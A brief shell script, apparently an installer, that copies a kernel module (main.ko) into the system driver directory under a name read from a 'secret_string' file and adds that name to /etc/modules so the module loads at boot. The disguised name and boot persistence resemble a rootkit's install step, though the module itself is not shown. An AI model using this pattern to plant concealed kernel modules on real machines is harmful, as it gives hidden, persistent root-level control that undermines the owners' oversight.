export SECRET_STRING=$(cat secret_string)

cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_STRING.ko"
echo "\n$SECRET_STRING\n" >> /etc/modules
depmod
